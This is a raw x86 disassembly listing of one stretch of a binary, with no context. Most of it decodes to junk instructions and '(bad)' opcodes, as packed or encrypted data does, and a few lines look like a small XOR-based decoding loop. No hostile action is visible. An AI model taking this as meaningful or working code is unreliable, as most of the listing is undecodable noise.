  403987:	stos   BYTE PTR es:[edi],al
  403988:	push   ss
  403989:	jecxz  0x40394f
  40398b:	and    eax,0xb75e4f46
  403990:	fldcw  WORD PTR [edx+0x16]
  403993:	jg     0x40397e
  403995:	js     0x403a03
  403997:	mov    bh,BYTE PTR ds:0x351ea2ec
  40399d:	xchg   DWORD PTR [ebp+ecx*4+0x72],esp
  4039a1:	mov    bl,0x13
  4039a3:	jecxz  0x403a12
  4039a5:	add    bl,BYTE PTR [ecx+0x16]
  4039a8:	adc    dh,al
  4039aa:	cdq    
  4039ab:	mov    al,0x90
  4039ad:	(bad)  [esi+0x487a1ef]
  4039b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039b4:	in     al,dx
  4039b5:	jb     0x4039bf
  4039b7:	lahf   
  4039b8:	pop    ecx
  4039b9:	out    0x54,eax
  4039bb:	or     eax,0x90eddb69
  4039c0:	fwait
  4039c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039c2:	and    al,0xca
  4039c4:	adc    bl,BYTE PTR [ebx]
  4039c6:	and    eax,DWORD PTR gs:[eax+0x2e1ee0f7]
  4039cd:	and    al,0x8d
  4039cf:	jp     0x4039f1
  4039d1:	xor    ebp,edi
  4039d3:	inc    eax
  4039d4:	push   edi
  4039d5:	sub    DWORD PTR [ecx-0x28],0xffffffcd
  4039d9:	jmp    0x9fd6:0x40e38d8e
  4039e0:	addr16 jbe 0x403a03
  4039e3:	inc    esp
  4039e4:	int    0x64
  4039e6:	jge    0x40399f
  4039e8:	sbb    eax,0xe76302c5
  4039ed:	shr    DWORD PTR [ebp+0x3c],cl
  4039f0:	sub    edi,DWORD PTR [esi]
  4039f2:	push   cs
  4039f3:	sub    DWORD PTR [edi],eax
  4039f5:	mov    dl,BYTE PTR [edx+0x77b90a9b]
  4039fb:	rcl    DWORD PTR [ebx+edx*4-0x40],0x0
  403a00:	or     al,0x57
  403a02:	clc    
  403a03:	(bad)  
  403a05:	mov    bh,BYTE PTR [esi]
  403a07:	repnz loopne 0x4039aa
  403a0a:	adc    al,0x66
  403a0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a0d:	jecxz  0x403a38
  403a0f:	inc    eax
  403a10:	jnp    0x403a67
  403a12:	popf   
  403a13:	jne    0x403a46
  403a15:	or     al,0xf2
  403a17:	jbe    0x403a5b
  403a19:	mov    ecx,DWORD PTR [edx]
  403a1b:	mov    eax,ds:0x5075e306
  403a20:	fwait
  403a21:	retf   0xa026
  403a24:	inc    edi
  403a25:	into   
  403a26:	retf   0xdab9
  403a29:	cmp    BYTE PTR [esi+0x552280a1],bl
  403a2f:	mov    esp,0x8cbd8be0
  403a34:	dec    ecx
  403a35:	(bad)
  403a38:	js     0x403a56
  403a3a:	outs   dx,DWORD PTR ds:[esi]
  403a3b:	adc    dl,BYTE PTR [eax-0x24038126]
  403a41:	push   0xae2ce214
  403a46:	dec    edx
  403a47:	shr    BYTE PTR [edi-0x6e],1
  403a4a:	aad    0x15
  403a4c:	push   esp
  403a4d:	xchg   ecx,eax
  403a4e:	xor    al,0xe8
  403a50:	retf   0x619a
  403a53:	jmp    0xee9:0x8416d6eb
  403a5a:	and    esp,DWORD PTR [esp+ebx*4-0x5ddafa15]
  403a61:	pop    edi
  403a62:	jl     0x403a68
  403a64:	imul   ebp,DWORD PTR [edx-0x54d35427],0xffffff93
  403a6b:	push   esi
  403a6c:	pushf  
  403a6d:	mov    ds:0xb2fd80c3,eax
  403a72:	enter  0x8c5e,0x88
  403a76:	pop    ecx
  403a77:	stos   BYTE PTR es:[edi],al
  403a78:	or     eax,0xc90e65f2
  403a7d:	or     al,0xb8
  403a7f:	in     eax,0xe2
  403a81:	xchg   edi,ebp
  403a83:	and    BYTE PTR [eax-0x4387028b],al
  403a89:	jo     0x403a81
  403a8b:	mov    al,0xec
  403a8d:	(bad)  
  403a8e:	pop    ecx
  403a8f:	imul   edx,DWORD PTR [esi],0xffffff80
  403a92:	daa    
  403a93:	jmp    0x2caa:0x5ef1a6d0
  403a9a:	inc    ebp
  403a9b:	jecxz  0x403b13
  403a9d:	mov    ch,0x5e
  403a9f:	inc    eax
  403aa0:	xchg   esi,eax
  403aa1:	in     eax,0x80
  403aa3:	add    al,0x98
  403aa5:	adc    DWORD PTR [edi-0x59ff25f4],esi
  403aab:	sub    al,0xf9
  403aad:	retf   
  403aae:	cwde   
  403aaf:	nop
  403ab0:	jnp    0x403a6b
  403ab2:	stos   BYTE PTR es:[edi],al
  403ab3:	add    DWORD PTR [ebx+0x3b],0xffffffef
  403ab7:	rcr    BYTE PTR [ebp-0x66a388bb],0xaf
  403abe:	mov    ds:0x470f8ee6,al
  403ac3:	cdq    
  403ac4:	xchg   esi,eax
  403ac5:	jo     0x403a4f
  403ac7:	fs cs mov esp,0x1ff7dfe1
  403ace:	mov    bh,0x87
  403ad1:	inc    esp
  403ad2:	adc    dh,BYTE PTR [edx-0x66248902]
  403ad8:	add    ecx,DWORD PTR [esi]
  403ada:	call   DWORD PTR [edx+0x54]
  403add:	pop    ss
  403ade:	out    dx,al
  403adf:	jnp    0x403aef
  403ae1:	mov    DWORD PTR [ebx+0x7156b542],ebp
  403ae7:	(bad)  
  403ae9:	fstp   TBYTE PTR [ecx-0x6b]
  403aec:	sbb    BYTE PTR [edi],ch
  403aee:	jmp    0x9ead:0x4933
  403af4:	js     0x403b4b
  403af6:	inc    eax
  403af7:	mov    al,ds:0x26bdf0c4
  403afc:	sbb    cl,BYTE PTR [eax+0x73]
  403aff:	adc    BYTE PTR [edx+0x34f0457e],bl
  403b05:	pop    esi
  403b06:	jmp    0x5f04:0x732bad49
  403b0d:	std    
  403b0e:	iret   
  403b0f:	(bad)  
  403b10:	mov    dl,0xa4
  403b12:	jp     0x403b62
  403b14:	add    BYTE PTR [eax],dl
  403b16:	icebp  
  403b17:	test   al,0xfc
  403b19:	sub    eax,0xe71419cd
  403b1e:	dec    edx
  403b1f:	pop    eax
  403b20:	xor    eax,0x8e55076
  403b25:	jl     0x403b16
  403b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b28:	imul   esp,ecx,0x2bb5ed6
  403b2e:	sub    BYTE PTR ds:0xf4d6df52,ch
  403b34:	fidiv  DWORD PTR [ebx+0x15b1d047]
  403b3a:	ffreep st(6)
  403b3c:	jbe    0x403b56
  403b3e:	adc    eax,0xdc0f83b3
  403b43:	call   0x1e10:0xab9befc9
  403b4a:	int3   
  403b4b:	inc    ebx
  403b4c:	inc    ecx
  403b4d:	jmp    FWORD PTR [ecx-0xf]
  403b50:	mov    BYTE PTR [esi-0x3b01fa96],bh
  403b56:	xchg   ecx,eax
  403b57:	(bad)  
  403b58:	lea    edx,[esi-0x14]
  403b5b:	cmp    ecx,DWORD PTR [esi+eiz*1+0x344d028a]
  403b62:	inc    ebx
  403b63:	xor    DWORD PTR [esi+0x6e],ebx
  403b66:	mov    edx,0xd418656f
  403b6b:	pop    ds
  403b6c:	dec    edx
  403b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b6e:	retf   
  403b6f:	sbb    ah,BYTE PTR [ecx-0x513d51ba]
  403b75:	jno    0x403b9c
  403b77:	cmp    DWORD PTR [ebx+0x0],esp
  403b7a:	dec    edx
  403b7b:	sub    bh,BYTE PTR [edi-0xa3d071e]
  403b81:	add    eax,0x77c9759d
  403b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b87:	pushf  
  403b88:	shl    dl,1
  403b8a:	sub    al,0xd4
  403b8c:	or     bl,BYTE PTR [ebx-0xb]
  403b8f:	jno    0x403be3
  403b91:	jmp    0x403bac
  403b93:	mov    al,0x5f
  403b95:	dec    edx
  403b96:	pop    edx
  403b97:	out    dx,al
  403b98:	xchg   edx,eax
  403b99:	push   0x39
  403b9b:	les    edx,FWORD PTR [eax+0x272b7e3d]
  403ba1:	xor    DWORD PTR [esi-0x1c],eax
  403ba4:	xor    bl,bh
  403ba6:	and    eax,0x4527db35
  403bab:	ret    
  403bac:	adc    al,0xf9
  403bae:	fldenv [eax-0x41b7833]
  403bb4:	xor    BYTE PTR [esi-0x4cf0a496],0x2
  403bbb:	cs mov gs,ebp
  403bbe:	sbb    BYTE PTR [esi-0x77],cl
  403bc1:	sbb    al,BYTE PTR [edx+0x56]
  403bc4:	xor    ecx,0xffffffee
  403bc7:	pop    esi
  403bc8:	int3   
  403bc9:	push   ebx
  403bca:	and    al,0x11
  403bcc:	push   edi
  403bcd:	lock inc esi
  403bcf:	jb     0x403c2d
  403bd1:	xchg   ebx,esi
  403bd3:	retf   0x5fa7
  403bd6:	xchg   DWORD PTR [edx+0x49],ebx
  403bd9:	jne    0x403bd0
  403bdb:	xchg   esi,eax
  403bdc:	js     0x403b87
  403bde:	fdivr  DWORD PTR [ebx]
  403be0:	push   edx
  403be1:	pop    esp
  403be2:	or     al,0xea
  403be4:	pushf  
  403be5:	push   ss
  403be6:	jp     0x403b7c
  403be8:	lea    eax,[edi*1+0x4797b07f]
  403bef:	sub    eax,0x66309746
  403bf4:	mov    edx,0xfdf40e7d
  403bf9:	(bad)
  403bfd:	fbstp  TBYTE PTR [edx-0x1e]
  403c00:	mov    esi,0x540f4856
  403c05:	pushf  
  403c06:	and    ebx,DWORD PTR ds:0x79bb937b
  403c0c:	add    BYTE PTR [ebp+0x36738676],bl
  403c12:	(bad)  
  403c13:	pop    eax
  403c14:	shr    BYTE PTR [esi+esi*8+0x5ace75],1
  403c1b:	lds    edi,FWORD PTR [eax]
  403c1d:	fwait
  403c1e:	add    ecx,edi
  403c20:	inc    eax
  403c21:	lock sti 
  403c23:	cmp    BYTE PTR [ebp-0x5150ffa7],0xd7
  403c2a:	xchg   edx,eax
  403c2b:	pop    es
  403c2c:	cmp    ebx,DWORD PTR [ebp-0x5b]
  403c2f:	or     dh,al
  403c31:	mov    ah,0x29
  403c33:	dec    ebp
  403c34:	cmp    BYTE PTR [esi+0x20],dl
  403c37:	aas    
  403c38:	cmp    BYTE PTR [esi-0xfd65d03],dl
  403c3e:	es mov dh,0x8c
  403c41:	push   edi
  403c42:	mov    WORD PTR [ebx+0x66],ds
  403c45:	outs   dx,BYTE PTR ds:[esi]
  403c46:	sub    dl,ch
  403c48:	das    
  403c49:	inc    ebx
  403c4a:	inc    edi
  403c4b:	fisubr DWORD PTR [ecx]
  403c4d:	fnstsw WORD PTR [eax-0x3c]
  403c50:	fst    QWORD PTR [ebp+0x16]
  403c53:	(bad)  
  403c54:	xchg   ebp,eax
  403c55:	cs aam 0xc6
  403c58:	or     ch,dh
  403c5a:	repnz or bh,0x8
  403c5e:	stos   BYTE PTR es:[edi],al
  403c5f:	(bad)  
  403c60:	loopne 0x403cd0
  403c62:	stos   DWORD PTR es:[edi],eax
  403c63:	jmp    0xfabff4cd
  403c68:	sub    al,0x3e
  403c6a:	scas   eax,DWORD PTR es:[edi]
  403c6b:	sbb    cl,dh
  403c6d:	lea    ecx,[ebx]
  403c6f:	push   0x63
  403c71:	push   es
  403c72:	cmp    ebp,edi
  403c74:	mov    dl,0xb4
  403c76:	fnstcw WORD PTR [ebp-0x6a]
  403c79:	mov    edx,0x3ef9dede
  403c7e:	mov    edi,0x5d1dc826
  403c83:	push   edx
  403c84:	jbe    0x403cfd
  403c86:	rol    BYTE PTR [ecx],0x5f
  403c89:	mov    cl,0x14
  403c8b:	pop    edi
  403c8c:	xchg   ecx,eax
  403c8d:	cmp    eax,0x95fe4d13
  403c92:	iret   
  403c93:	in     eax,dx
  403c94:	jo     0x403ca2
  403c96:	stc    
  403c97:	and    edi,DWORD PTR [edx-0x728b10d9]
  403c9d:	add    BYTE PTR [edx+eiz*2-0x38fc99f0],0xf
  403ca5:	mov    bh,0xc0
  403ca7:	mov    DWORD PTR [ebp-0x14],eax
  403caa:	mov    eax,DWORD PTR [ebp+0x8]
  403cad:	movzx  eax,WORD PTR [eax+edx*4]
  403cb1:	xor    eax,0x8a38
  403cb6:	add    eax,edi
  403cb8:	mov    edi,DWORD PTR [ebp-0x14]
  403cbb:	mov    BYTE PTR [ebp+edi*1-0x58],al
  403cbf:	mov    eax,DWORD PTR [ebp-0xc]
  403cc2:	inc    edx
  403cc3:	cmp    edx,eax
  403cc5:	jne    0x40389a
  403ccb:	pop    edi
  403ccc:	pop    ebx
  403ccd:	mov    eax,DWORD PTR [ebp-0x8]
  403cd0:	mov    edx,DWORD PTR [ebp+0x10]
  403cd3:	xor    eax,ecx
  403cd5:	add    eax,esi
  403cd7:	mov    DWORD PTR [edx],eax
  403cd9:	jmp    0x4040ce
  403cde:	mov    ch,0xd5
  403ce0:	or     dh,al
  403ce2:	push   0xfffffff1
  403ce4:	jge    0x403d43
  403ce6:	inc    eax
  403ce7:	xchg   ecx,eax
  403ce8:	add    esp,0x94f47b6
  403cee:	mov    ebx,0x567e7e1f
  403cf3:	jns    0x403d73
  403cf5:	jle    0x403d74
  403cf7:	in     al,dx
  403cf8:	mov    ?,WORD PTR [edx]
  403cfa:	mov    eax,0x6336b07b
  403cff:	xor    eax,0x5cb6fe31
  403d04:	mov    ch,0x2
  403d06:	fisub  DWORD PTR [edi+ecx*8]
  403d09:	(bad)  
  403d0a:	inc    esp
  403d0b:	push   edi
  403d0c:	(bad)  
  403d0d:	icebp  
  403d0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0f:	inc    esi
  403d10:	ret    0xf9f3
  403d13:	xchg   edx,eax
  403d14:	paddsb mm1,QWORD PTR [esi-0x69]
  403d18:	mov    edi,fs
  403d1a:	xor    al,0xa5
  403d1c:	mov    bh,0x18
  403d1e:	in     eax,0x7f
  403d20:	push   es
  403d21:	mov    edi,DWORD PTR ds:0x2838b3fb
  403d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d28:	mov    dl,0x23
  403d2a:	les    edi,FWORD PTR [ebx-0x43]
  403d2d:	pop    eax
  403d2e:	sbb    eax,DWORD PTR [edx+0x6d4943fb]
  403d34:	jae    0x403d13
  403d36:	(bad)  [edi+0xd]
  403d39:	pop    ecx
  403d3a:	mov    cl,0x4a
  403d3c:	pop    ebx
  403d3d:	sub    dl,BYTE PTR [eax+0x39]
  403d40:	dec    ecx
  403d41:	jno    0x403d8b
  403d43:	xchg   BYTE PTR [ebx-0x27],al
  403d46:	or     ah,al
  403d48:	jl     0x403d7a
  403d4a:	ins    DWORD PTR es:[edi],dx
  403d4b:	dec    edx
  403d4c:	cwde   
  403d4d:	mov    BYTE PTR [eax+0x63],dl
  403d50:	out    dx,eax
  403d51:	popa   
  403d52:	mov    ebp,0xcebad0f9
  403d57:	jge    0x403d41
  403d59:	rcl    BYTE PTR [edi+0x4c],cl
  403d5c:	ins    BYTE PTR es:[edi],dx
  403d5d:	je     0x403d5f
  403d5f:	jp     0x403ce6
  403d61:	mov    al,bh
  403d63:	fsubr  QWORD PTR [esi-0x53]
  403d66:	arpl   WORD PTR [esi-0x53],di
  403d69:	or     eax,0xad9be547
  403d6e:	xchg   BYTE PTR [ebx+0x13],ch
  403d71:	lea    edi,[edx-0x3]
  403d74:	cmpps  xmm3,XMMWORD PTR [eax-0xc],0x5b
  403d79:	ss mov edi,0x167dbc3d
  403d7f:	outs   dx,DWORD PTR ds:[esi]
  403d80:	jecxz  0x403d7d
  403d82:	sub    ah,bh
  403d84:	sbb    dh,ah
  403d86:	mov    cs,WORD PTR [ecx+0xfc8e31b]
  403d8c:	or     al,0x17
  403d8e:	dec    esi
  403d8f:	jmp    0x403d4e
  403d91:	cmc    
  403d92:	or     al,0xa6
  403d94:	push   ss
  403d95:	mov    DWORD PTR [esi-0x5033aa76],ebx
  403d9b:	xor    DWORD PTR [esi+eiz*4+0x3a7c88a8],edi
  403da2:	jp     0x403d6e
  403da4:	sbb    DWORD PTR [edi],esi
  403da6:	push   esi
  403da7:	dec    esp
  403da8:	xchg   edi,eax
  403da9:	or     eax,0xcac3fb61
  403dae:	test   al,0x6d
  403db0:	inc    esp
  403db1:	repz sub BYTE PTR [ebx],bl
  403db4:	sub    DWORD PTR [eax-0x9],0xffffffa2
  403db8:	shl    BYTE PTR [esi-0x15c1d1b2],1
  403dbe:	jg     0x403e0b
  403dc0:	dec    esp
  403dc1:	div    BYTE PTR [esi]
  403dc3:	loope  0x403dfe
  403dc5:	mov    ah,0x52
  403dc7:	push   ss
  403dc8:	fnstsw WORD PTR [esi+0x296677cf]
  403dce:	fwait
  403dcf:	(bad)
  403dd3:	mov    ds:0x16cb79e8,al
  403dd8:	adc    DWORD PTR es:[eax+0x58],0xffffffaa
  403ddd:	mov    ebp,0x922a223f
  403de2:	or     eax,0xb6a7cdf3
  403de7:	int3   
  403de8:	push   edx
  403de9:	(bad)  
  403dea:	div    BYTE PTR ds:[edx-0x7f]
  403dee:	sahf   
  403def:	jmp    0x403e43
  403df1:	inc    esi
  403df2:	mov    ecx,0x6c59c165
  403df7:	xchg   edi,eax
  403df8:	jb     0x403da6
  403dfa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dfb:	sti    
  403dfc:	sbb    al,0x9b
  403dfe:	and    DWORD PTR [edi+0x15f22433],esp
  403e04:	xchg   edi,eax
  403e05:	popf   
  403e06:	inc    eax
  403e07:	xchg   ecx,eax
  403e08:	mov    dl,0x2e
  403e0a:	retf   
  403e0b:	push   cs
  403e0c:	inc    ebx
  403e0d:	dec    BYTE PTR [esi+0x5e]
  403e10:	loopne 0x403e8e
  403e12:	(bad)  
  403e13:	fimul  WORD PTR [edx]
  403e15:	mov    ebx,0xd022e029
  403e1a:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e1c:	pcmpgtb mm2,mm2
  403e1f:	out    0x22,al
  403e21:	popf   
  403e22:	or     ebx,eax
  403e24:	loop   0x403dee
  403e26:	mov    cl,0xc5
  403e28:	daa    
  403e29:	mov    ebx,0xfdad08c3
  403e2e:	(bad)  
  403e2f:	mov    bl,0x72
  403e31:	push   ecx
  403e32:	dec    ebx
  403e33:	sahf   
  403e34:	inc    ebx
  403e35:	gs pushf 
  403e37:	in     eax,0x19
  403e39:	ror    BYTE PTR [eax+ebp*4-0x6],cl
  403e3d:	mov    ebp,0xafb0b0da
  403e42:	jmp    0x31fa3bb7
  403e47:	jnp    0x403e3e
  403e49:	fisttp QWORD PTR [esi+0x27]
  403e4c:	test   BYTE PTR ds:0xa85e6bbf,bl
  403e52:	inc    esp
  403e53:	dec    esp
  403e54:	lods   eax,DWORD PTR ds:[esi]
  403e55:	or     eax,0xcae07c2e
  403e5a:	stos   DWORD PTR es:[edi],eax
  403e5b:	xchg   ecx,eax
  403e5c:	bound  ecx,QWORD PTR [edi]
  403e5e:	dec    edi
  403e5f:	inc    ax
  403e61:	xchg   ebp,eax
  403e62:	jmp    0xbc68c75d
  403e67:	xchg   ecx,eax
  403e68:	mov    ch,0x99
  403e6a:	jne    0x403e14
  403e6c:	and    ebp,DWORD PTR [ecx-0x56]
  403e6f:	push   edi
  403e70:	imul   BYTE PTR [edi+edi*4+0x2bdc7380]
  403e77:	out    0x92,eax
  403e79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e7a:	in     eax,0x38
  403e7c:	xor    bh,BYTE PTR [edi-0x52990565]
  403e82:	sbb    eax,0xad4b48d7
  403e87:	or     al,0x5d
  403e89:	jb     0x403ea5
  403e8b:	dec    esp
  403e8c:	mov    ds:0x7eb872df,al
  403e91:	xchg   esp,eax
  403e92:	pop    es
  403e93:	aad    0xe0
  403e95:	leave  
  403e96:	aad    0x1b
  403e98:	call   0xe7db:0xf76b1883
  403e9f:	pop    es
  403ea0:	add    ecx,DWORD PTR [esi]
  403ea2:	mov    al,0xe5
  403ea4:	cdq    
  403ea5:	(bad)  
  403ea6:	sub    eax,0x18422c65
  403eab:	cld    
  403eac:	adc    al,0xff
  403eae:	pushf  
  403eaf:	in     al,0xf5
  403eb1:	movdq2q mm2,xmm2
  403eb5:	or     BYTE PTR [edx+0x30],ah
  403eb8:	nop
  403eb9:	dec    ebx
  403eba:	(bad)  
  403ebc:	fisubr WORD PTR [edi]
  403ebe:	out    dx,eax
  403ebf:	jecxz  0x403f03
  403ec1:	xlat   BYTE PTR ds:[ebx]
  403ec2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ec3:	mov    ch,0x82
  403ec5:	sti    
  403ec6:	pop    ebx
  403ec7:	and    eax,DWORD PTR [esi+0x32]
  403eca:	test   DWORD PTR [ebp-0x21],ecx
  403ecd:	and    DWORD PTR [esi-0x4e1d4058],ecx
  403ed3:	gs dec edx
  403ed5:	cmp    bl,dl
  403ed7:	aam    0xfe
  403ed9:	test   DWORD PTR [eax-0x75],edx
  403edc:	cmp    DWORD PTR [ebp+0x78],eax
  403edf:	xlat   BYTE PTR ds:[ebx]
  403ee0:	dec    edi
  403ee1:	retf   
  403ee2:	push   es
  403ee3:	retf   0xe114
  403ee6:	push   ds
  403ee7:	pop    es
  403ee8:	jnp    0x403e9d
  403eea:	call   0x3798:0x934b5d87
  403ef1:	ins    BYTE PTR es:[edi],dx
  403ef2:	xor    bl,BYTE PTR [ecx+0x4f]
  403ef5:	push   es
  403ef6:	imul   edx,DWORD PTR [ebp+0x62],0xe57fbd11
  403efd:	xchg   esi,eax
  403efe:	dec    ebp
  403eff:	loope  0x403f4b
  403f01:	imul   ebp,DWORD PTR [edi-0x1d76d25b],0xfffffff6
  403f08:	xor    DWORD PTR [edx],edi
  403f0a:	xor    BYTE PTR [esi-0x6f],0xc1
  403f0e:	(bad)  
  403f0f:	popf   
  403f10:	cmp    ah,BYTE PTR [ebp+0x3a]
  403f13:	shl    DWORD PTR [eax+0x3f],cl
  403f16:	mov    al,ds:0x7332ed68
  403f1b:	loop   0x403ec3
  403f1d:	js     0x403f59
  403f1f:	cs call 0xca883232
  403f25:	add    ecx,DWORD PTR [ecx+0x115fd610]
  403f2b:	test   BYTE PTR [eax-0x22f05195],dl
  403f31:	cmp    eax,0xcfe9e6e5
  403f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f37:	mov    al,ds:0xe26e40b8
  403f3c:	or     al,0x8f
  403f3e:	jle    0x403f4f
  403f40:	loop   0x403ee2
  403f42:	js     0x403f99
  403f44:	(bad)  
  403f45:	fisubr WORD PTR [esi+0x30]
  403f48:	ins    BYTE PTR es:[edi],dx
  403f49:	mov    edx,0x29e0202
  403f4e:	dec    DWORD PTR [ebp+0x41]
  403f51:	mov    ds:0x98df1cb6,eax
  403f56:	pop    ss
  403f57:	xchg   ebp,eax
  403f58:	out    0xe3,eax
  403f5a:	inc    esi
  403f5b:	mov    dh,0x38
  403f5d:	lock (bad) 
  403f5f:	imul   ecx,DWORD PTR [ebp+0x78294e16],0xffffffd4
  403f66:	sbb    BYTE PTR [ecx-0x6d],ah
  403f69:	dec    eax
  403f6a:	xchg   esi,eax
  403f6b:	nop
  403f6c:	aas    
  403f6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f6e:	shl    edx,0x3b
  403f71:	in     eax,dx
  403f72:	cmp    BYTE PTR [eax+0x57],0xeb
  403f76:	lods   al,BYTE PTR ds:[esi]
  403f77:	aas    
  403f78:	mov    eax,ds:0x152322a0
  403f7d:	test   al,0xca
  403f7f:	test   DWORD PTR [edi+0x6e43ba49],0xf28cba66
  403f89:	outs   dx,DWORD PTR ds:[esi]
  403f8a:	inc    edx
  403f8b:	dec    esi
  403f8c:	sub    eax,0x5b3471a9
  403f91:	jns    0x404010
  403f93:	out    0x64,eax
  403f95:	cmc    
  403f96:	repz xor eax,0xbfa68877
  403f9c:	fwait
  403f9d:	push   esi
  403f9e:	sub    al,0xb3
  403fa0:	test   ch,0x6e
  403fa3:	dec    edx
  403fa4:	cdq    
  403fa5:	retf   0xa2f6
  403fa8:	retf   
  403fa9:	pop    ss
  403faa:	data16 fs or al,0x9
  403fae:	js     0x403ff8
  403fb0:	dec    BYTE PTR [eax+ebp*4+0x45]
  403fb4:	aas    
  403fb5:	loop   0x403fd8
  403fb7:	leave  
  403fb8:	(bad)  
  403fba:	ins    BYTE PTR es:[edi],dx
  403fbb:	cmp    al,0x1c
  403fbd:	out    0xea,eax
  403fbf:	and    BYTE PTR [ebx],ah
  403fc1:	jns    0x403f58
  403fc3:	cwde   
  403fc4:	inc    ebp
  403fc5:	scas   eax,DWORD PTR es:[edi]
  403fc6:	ds pop ebx
  403fc8:	push   cs
  403fc9:	call   0xcfa3f236
  403fce:	lock jmp DWORD PTR [edx]
  403fd1:	mov    ?,WORD PTR [esi+0x73]
  403fd4:	int    0x7a
  403fd6:	adc    cl,BYTE PTR [eax-0xe]
  403fd9:	shr    DWORD PTR [ecx-0xd],cl
  403fdc:	daa    
  403fdd:	mov    BYTE PTR ss:[eax-0x1758a013],0x2d
  403fe5:	cmp    eax,0xcbaefdd9
  403fea:	jle    0x404032
  403fec:	pushf  
  403fed:	(bad)  
  403fee:	adc    ah,dh
  403ff0:	lea    ecx,[edi+0x6b]
  403ff3:	fwait
  403ff4:	aam    0x15
  403ff6:	mov    edi,0x8ee77b1d
  403ffb:	mov    al,ds:0x63d4314
  404000:	aas    
  404001:	(bad)  
  404002:	mov    dl,0x4
  404004:	sub    eax,0xf1fe646d
  404009:	mov    esp,0x8999ef57
  40400e:	cld    
  40400f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404010:	call   0xb45f:0x46b86202
  404017:	mov    esp,0xab791d47
  40401c:	in     al,0x76
  40401e:	mov    bp,0x842b
  404022:	in     eax,dx
  404023:	(bad)  
  404024:	adc    BYTE PTR [ebp-0x3ffeae26],bh
  40402a:	pop    ebx
  40402b:	adc    ecx,DWORD PTR [esi-0x79d105fa]
  404031:	gs push esi
  404033:	cmp    BYTE PTR [edi],bh
  404035:	inc    ebx
  404036:	iret   
  404037:	add    dl,BYTE PTR [edi+0x1a655ed5]
  40403d:	xchg   edx,eax
  40403e:	inc    esp
  40403f:	add    al,0xa5
  404041:	adc    al,BYTE PTR [edx]
  404043:	cmp    bh,BYTE PTR [edi+0x6e]
  404046:	adc    bh,BYTE PTR [ebx-0x3765d061]
  40404c:	dec    edi
  40404d:	stos   BYTE PTR es:[edi],al
  40404e:	pop    ecx
  40404f:	mov    eax,0xc137a3f6
  404054:	arpl   WORD PTR [eax+ebx*1],dx
  404057:	jl     0x403ffb
  404059:	push   0xb43d0203
  40405e:	dec    ecx
  40405f:	je     0x404008
  404061:	cwde   
  404062:	jmp    0x38b0:0x1eaa4ead
  404069:	(bad)  
  40406a:	lock sbb bh,cl
  40406d:	cs push esp
  40406f:	test   al,0x72
  404071:	push   ebx
  404072:	push   ebp
  404073:	jp     0x40400d
  404075:	vcmppd ymm4,ymm5,ymm7,0x4f
  40407a:	(bad)  
  40407e:	int    0x3a
  404080:	dec    ecx
  404081:	jb     0x40400c
  404083:	jbe    0x40406a
  404085:	or     BYTE PTR [ecx+0x44],al
  404088:	cwde   
  404089:	mov    ch,0xa8
  40408b:	push   ebp
  40408c:	xchg   esi,eax
  40408d:	dec    ebp
  40408e:	jo     0x40405a
  404090:	pop    edx
  404091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404092:	sysexit 
  404094:	dec    esi
  404095:	dec    ebp
  404096:	cmp    DWORD PTR [ebp-0x78],ecx
  404099:	fdiv   st(1),st
  40409b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40409c:	(bad)  
  40409d:	jmp    ecx
  40409f:	or     DWORD PTR [ebp+0x1],eax
  4040a2:	jp     0x404107
  4040a4:	outs   dx,DWORD PTR ds:[esi]
  4040a5:	fadd   QWORD PTR [esi]
  4040a7:	fnstsw WORD PTR [eax+0x7459ed47]
  4040ad:	sar    DWORD PTR [ebx],0x2
  4040b0:	inc    ebp
  4040b1:	push   esp
  4040b2:	pop    esp
  4040b3:	dec    edx
  4040b4:	cmp    ebp,DWORD PTR [edi+0x2990d02b]
  4040ba:	repz (bad) 
  4040bd:	jle    0x404103
  4040bf:	dec    eax
  4040c0:	dec    eax
  4040c1:	mov    al,0x73
  4040c3:	cs jge 0x4040df
  4040c6:	inc    ecx
  4040c7:	adc    eax,0x2356374
  4040cc:	and    esi,DWORD PTR [ebx-0x75]
  4040cf:	inc    ebp
  4040d0:	clc    
  4040d1:	xor    eax,ecx
  4040d3:	add    eax,esi
  4040d5:	mov    DWORD PTR [ebp+0x8],eax
  4040d8:	mov    eax,DWORD PTR [ebp+0x8]
  4040db:	jmp    0x4044d0
  4040e0:	pop    edx
  4040e1:	ret    0x1375
  4040e4:	jge    0x4040a3
  4040e6:	ins    BYTE PTR es:[edi],dx
  4040e7:	jae    0x404096
  4040e9:	test   BYTE PTR [eax-0x6a6bdc33],ah
  4040ef:	mov    edx,DWORD PTR [ebx+0x567e7e1b]
  4040f5:	jns    0x404175
  4040f7:	jle    0x4040da
  4040f9:	(bad)  [edx]
  4040fb:	adc    al,0xad
  4040fd:	adc    DWORD PTR [edx-0x56781100],eax
  404103:	sbb    DWORD PTR [edi+0xb],ebp
  404106:	in     al,dx
  404107:	in     al,0xde
  404109:	fld    QWORD PTR [ebx-0x27]
  40410c:	cmc    
  40410d:	in     al,0xa2
  40410f:	lahf   
  404110:	xchg   DWORD PTR [eax],esp
  404112:	jmp    0x1bffbbc7
  404117:	test   al,0xf2
  404119:	inc    esi
  40411a:	neg    ebp
  40411c:	repz mov ebp,DWORD PTR [ebp+0x26]
  404120:	and    al,0xbc
  404122:	and    BYTE PTR [ecx],al
  404124:	loope  0x404143
  404126:	(bad)  
  404127:	hlt    
  404128:	jbe    0x4040c1
  40412a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
